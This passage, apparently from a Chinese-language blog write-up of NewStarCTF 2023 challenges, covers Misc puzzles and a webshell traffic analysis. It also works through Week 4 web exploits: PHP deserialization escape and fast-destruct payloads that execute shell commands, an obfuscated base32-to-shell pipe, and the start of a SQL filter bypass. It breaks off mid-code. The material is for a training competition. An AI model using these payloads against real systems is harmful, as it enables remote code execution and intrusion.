&quot;</span>JJLEMRSDK5BUQR2KIJCUGUSTK5FUUSSVINJUWVKJJZDVKTKXKNMEWRSFKVCVIU2PJFLESVKJJZBUWS2KIFKU2TSLKRETKRSUJNKVGUKKGVFEMRKXINBEUUSOIZCVEMSGJRDEUVCJKRFVGS2OIVCUWV2DIVEVMR2WIVLUGR2MIZGVMSKUJNHEWSSJIVHVESZSJFJEIVJUKFJUESJVIFKE6UJSJZFFMRSFI46T2PI=<span class="hljs-string">&quot; | base32 -d | base32 -d |base32 -d |/bin/[r-t]h&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;qwejaskdjnlka&quot;</span>;r:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc"></a>Misc</h2><h3 id="阳光开朗大男孩"><a href="#阳光开朗大男孩" class="headerlink" title="阳光开朗大男孩"></a>阳光开朗大男孩</h3><p>secret.txt社会主义核心价值观编码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">法治自由公正爱国公正敬业法治和谐平等友善敬业法治富强公正民主法治和谐法治和谐法治法治公正友善敬业法治文明公正自由平等诚信平等公正敬业法治和谐平等友善敬业法治和谐和谐富强和谐富强和谐富强平等友善敬业公正爱国和谐自由法治文明公正自由平等友善敬业法治富强和谐自由法治和谐法治和谐法治和谐法治法治和谐富强法治文明公正自由公正自由公正自由公正自由<br></code></pre></td></tr></table></figure><p><code>得到this_password_is_s000_h4rd_p4sssw0rdddd</code></p><p>打开flag.txt</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🌊⏩🔬🚹✉☀☺🚹🐅🎤🛩💵🌿🌊🚰😊🌊✉🐎❓🎈🌉👑🎅📮🥋👣🕹🚪☀🔄🚫🐍❓🐍😊☀🔬🍍🤣🎈🥋🙃👑🌏🐎🌊📮😂💵🏹👉❓😇🍴💧☺💵😁☃👉🎅👁☂🌿👉🍴🌪👌🍴🍵🖐😇🍍😀🗒🗒<br></code></pre></td></tr></table></figure><p>基于<code>AES-EMOJI</code>的原理其实就是一个换表base64然后加个ECB模式的AES，把原来base64的64个字符加个&#x3D;号一共65个字符替换成65个emoji字符</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> string<br>emojisInit=<span class="hljs-string">&quot;🍎🍌🏎🚪👁👣😀🖐ℹ😂🥋✉🚹🌉👌🍍👑👉🎤🚰☂🐍💧✖☀🦓🏹🎈😎🎅🐘🌿🌏🌪☃🍵🍴🚨📮🕹📂🛩⌨🔄🔬🐅🙃🐎🌊🚫❓⏩😁😆💵🤣☺😊😇😡🎃😍✅🔪🗒&quot;</span><br>alpha = string.ascii_lowercase+string.ascii_uppercase+string.digits+<span class="hljs-string">&quot;+/=&quot;</span><br>cipher = <span class="hljs-string">&quot;🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🌊⏩🔬🚹✉☀☺🚹🐅🎤🛩💵🌿🌊🚰😊🌊✉🐎❓🎈🌉👑🎅📮🥋👣🕹🚪☀🔄🚫🐍❓🐍😊☀🔬🍍🤣🎈🥋🙃👑🌏🐎🌊📮😂💵🏹👉❓😇🍴💧☺💵😁☃👉🎅👁☂🌿👉🍴🌪👌🍴🍵🖐😇🍍😀🗒🗒&quot;</span><br>base64data = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher:<br>    base64data += alpha[emojisInit.index(i)]<br><span class="hljs-built_in">print</span>(base64data)<br><span class="hljs-comment">#U2FsdGVkX19WZSmly4mTsP2FWt5WlVYBnqDMkfNdyRXvYv5ySp3BkUqGVWMj2ArY6Kw420IrDeuFrKHoKJh6pg==</span><br></code></pre></td></tr></table></figure><p>AES解密,key是<code>s000_h4rd_p4sssw0rdddd</code></p><p><img src="/2023/10/23/NewStarCTF2023/week3_misc1.png" alt="week3_misc1"></p><h3 id="滴滴滴"><a href="#滴滴滴" class="headerlink" title="滴滴滴"></a>滴滴滴</h3><p>wav文件听起来像是拨号音，在<a href="http://dialabc.com/sound/detect/index.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTc5ODYxNzksImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5Nzk4NTg3OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMyNzcwOTUzNX0.0JH7aNpFHXnhVV3SMs15dRFcDbFI7Z9AvJeAT_FSWeM">http://dialabc.com/sound/detect/index.html</a> 进行拨号音识别：</p><p><img src="/2023/10/23/NewStarCTF2023/1697987581079.png" alt="1697987581079"></p><p>得到拨号音的内容为：</p><p>52563319066</p><p>结合题目简介的提示，这串数字应该是某处使用的密码，因此可以尝试steghide工具来对jpg图片进行隐写内容提取：</p><p><code>steghide extract -sf secret.jpg</code> </p><p>得到fffflllllaaaaaggggg.txt</p><p><code>flag&#123;1nf0rm4t10n_s3cur1ty_1s_a_g00d_j0b_94e0308b&#125;</code></p><h3 id="大怨种"><a href="#大怨种" class="headerlink" title="大怨种"></a>大怨种</h3><p>给了一个gif，gifframe查看</p><p>第二张含有一张汉信码，在线解密<a href="https://tuzim.net/hxdecode/">在线汉信码识别,汉信码解码 - 兔子二维码 (tuzim.net)</a></p><p><img src="/2023/10/23/NewStarCTF2023/week3_misc2.png" alt="week3_misc2"></p><p><code>flag&#123;1_d0nt_k0nw_h0w_to_sc4n_th1s_c0d3_acef808a868e&#125;</code></p><h3 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h3><p>usb流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r draobyek.pcapng -Y <span class="hljs-string">&#x27;usb.data_len == 8&#x27;</span> -Y <span class="hljs-string">&#x27;usb.src ==&quot;1.15.1&quot;&#x27;</span> -T fields -e usbhid.data | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; draobyek1.txt<br></code></pre></td></tr></table></figure><p>得到（其中<DEL>表示删除，<SPACE>表示空格，根据这个按键顺序对数据进行处理后得到flag）</SPACE></DEL></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">w3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;2023&lt;SPACE&gt;flag&lt;SPACE&gt;is&lt;SPACE&gt;here&lt;SPACE&gt;vbafjwrisgjadwwiihdgja13882hxbbbna     &lt;CAP&gt;&lt;CAP&gt;ff&lt;DEL&gt;lll&lt;DEL&gt;&lt;DEL&gt;aaa&lt;DEL&gt;&lt;DEL&gt;gggg&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#123;999&lt;DEL&gt;&lt;DEL&gt;999&lt;DEL&gt;&lt;DEL&gt;11&lt;DEL&gt;9aaa&lt;DEL&gt;&lt;DEL&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;eb2---&lt;DEL&gt;&lt;DEL&gt;a450---&lt;DEL&gt;&lt;DEL&gt;2f5f&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;--&lt;DEL&gt;7bfc[unknown][unknown][unknown]-8989&lt;DEL&gt;&lt;DEL&gt;dfdf&lt;DEL&gt;&lt;DEL&gt;4bfa4bfa&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;85848584&#125;&#125;&#125;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#125;]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;nice&lt;SPACE&gt;work!1you&lt;SPACE&gt;got&lt;SPACE&gt;this&lt;SPACE&gt;flag<br>output :w3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;2023&lt;SPACE&gt;flag&lt;SPACE&gt;is&lt;SPACE&gt;here&lt;SPACE&gt;vbafjwrisgjadwwiihdgja13882hxbbbna     &lt;CAP&gt;FLAG&#123;9919AEB2-A450-2F5F-7BFC[UNKNOWN][UNKNOWN][UNKNOWN]-89DF4BFA8584&#125;]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;NICE&lt;SPACE&gt;WORK!1YOU&lt;SPACE&gt;GOT&lt;SPACE&gt;THIS&lt;SPACE&gt;FLAG<br>flag&#123;9919aeb2-a450-2f5f-7bfc-89df4bfa8584&#125;<br></code></pre></td></tr></table></figure><h3 id="2-分析"><a href="#2-分析" class="headerlink" title="2-分析"></a>2-分析</h3><blockquote><p>但你心中仍然有一种不祥的预感，这时你的同事告诉你这台服务器已经被攻击者获取到了权限，需要你尽快去还原攻击者的攻击路径，调查清楚攻击者是如何获取到服务器权限的。；FLAG格式flag{md5(攻击者登录使用的用户名_存在漏洞的文件名_WebShell文件名)}；例如flag{testuser_123.php_shell.php}，将括号内的内容进行md5编码得到flag{58aec571c731faae1369b461d3927596}即为需要提交的Flag</p></blockquote><p>一般登录请求都是POST方式的请求，因此可以先过滤出所有的POST请求：</p><p>http &amp;&amp; http.request.method &#x3D;&#x3D; POST</p><p>可以看到有一个发送给&#x2F;api&#x2F;action&#x2F;login.php的POST请求中有username和password字段</p><p>其次是存在漏洞的文件名和WebShell文件名，可以看到有大量的目录扫描流量，先使用WireShark过滤器过滤掉响应状态码为404的响应：</p><p>http &amp;&amp; http.response.code !&#x3D; 404</p><p>响应格式是文件包含漏洞包含pearcmd.php GetShell的响应</p><p><img src="/2023/10/23/NewStarCTF2023/1698071032479.png" alt="1698071032479"></p><p>index.php文件的page参数存在任意文件包含漏洞，攻击者通过这个漏洞包含pearcmd.php向服务器中写入了名为wh1t3g0d.php的WebShell。</p><p>而后续的流量也可以看到攻击者是利用wh1t3g0d.php这个Shell执行了一些系统命令</p><p><img src="/2023/10/23/NewStarCTF2023/1697986650404.png" alt="1697986650404"></p><p><img src="/2023/10/23/NewStarCTF2023/1697986662607.png" alt="1697986662607"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">best_admin_index<span class="hljs-selector-class">.php_wh1t3g0d</span><span class="hljs-selector-class">.php</span><br>flag&#123;<span class="hljs-number">4069</span>afd7089f7363198d899385ad688b&#125;<br></code></pre></td></tr></table></figure><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web"></a>Web</h2><h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>,<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]))));<br></code></pre></td></tr></table></figure><p>反序列化字符逃逸</p><p>关键代码在于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>,<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们可控的只有key的值，因此需要通过这里的字符长度的变化来修改序列化字符串，从而实现对于cmd值的控制。</p><p>payload：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-keyword">cmd</span><span class="language-bash"><span class="hljs-string">&quot;;s:2:&quot;</span><span class="hljs-built_in">ls</span><span class="hljs-string">&quot;;&#125;</span></span><br><br>实际数据O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;GetFlag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;s:<span class="hljs-number">88</span>:<span class="hljs-string">&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-keyword">cmd</span><span class="language-bash"><span class="hljs-string">&quot;</span>;s:6:<span class="hljs-string">&quot;whoami&quot;</span>;&#125;</span><br>最终payload：<br>?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-keyword">cmd</span><span class="language-bash"><span class="hljs-string">&quot;;s:9:&quot;</span><span class="hljs-built_in">cat</span> /flag<span class="hljs-string">&quot;;&#125;</span></span><br></code></pre></td></tr></table></figure><h3 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h3><blockquote><p>再快一点我就能拿到Flag了,如果Destruct能早一点触发就好了…</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>))&#123;<br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not Flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NewStar&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$web</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>();<br><span class="hljs-variable">$web</span>-&gt;func=<span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$web</span>-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-string">&#x27;ls /&#x27;</span>;<br><span class="hljs-variable">$pwn</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>();<br><span class="hljs-variable">$pwn</span>-&gt;obj=<span class="hljs-variable">$web</span>;<br><span class="hljs-variable">$re</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>();<br><span class="hljs-variable">$re</span>-&gt;func=<span class="hljs-variable">$pwn</span>;<br><span class="hljs-variable">$crypto</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>();<br><span class="hljs-variable">$crypto</span>-&gt;obj=<span class="hljs-variable">$re</span>;<br><span class="hljs-variable">$start</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$start</span>-&gt;errMsg=<span class="hljs-variable">$crypto</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$start</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-title function_ invoke__">destruct</span>()-&gt;<span class="hljs-title function_ invoke__">toStirng</span>()-&gt;<span class="hljs-title function_ invoke__">get</span>()-&gt;invoke-&gt;evil<br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>题目提示destruct早一点触发</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.去掉序列化尾部 &#125;<br>2.修改序列化数字元素个数<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;&#125;&#125;&#125;&#125;<br><span class="hljs-attribute">O</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;&#125;&#125;&#125;&#125;&#125;<br><span class="hljs-attribute">O</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;cat /f*&quot;</span>;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>本质上，fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的<code>__destruct()</code>,提前触发反序列化链条。</p><h3 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h3><p>过滤了空格和&#x3D;</p><p>使用&#x2F;**&#x2F;和like绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 